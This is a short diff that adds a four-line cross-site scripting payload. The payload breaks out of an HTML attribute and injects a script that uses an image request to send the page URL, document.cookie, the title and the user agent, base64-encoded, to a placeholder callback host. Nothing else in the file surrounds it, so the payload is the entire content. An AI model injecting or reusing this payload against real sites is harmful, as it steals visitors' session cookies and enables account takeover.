@@ -1,0 +1,4 @@
+"><script>
+var i=new Image();
+i.src='https://CALLBACK/?'+btoa(document.location+'|'+document.cookie+'|'+document.title+'|'+navigator.userAgent);
+</script>
